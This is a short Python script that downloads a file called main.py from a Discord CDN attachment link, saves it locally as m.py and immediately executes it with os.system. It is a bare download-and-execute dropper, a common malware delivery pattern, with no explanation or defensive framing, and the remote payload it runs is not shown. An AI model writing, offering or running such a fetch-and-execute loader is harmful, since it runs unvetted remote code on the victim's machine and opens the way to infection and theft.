import requests, os



with open("m.py", 'wb') as f:
    f.write(requests.get('https://cdn.discordapp.com/attachments/1056641362369446001/1056659866720149554/main.py').content)
    f.close()

os.system("py m.py")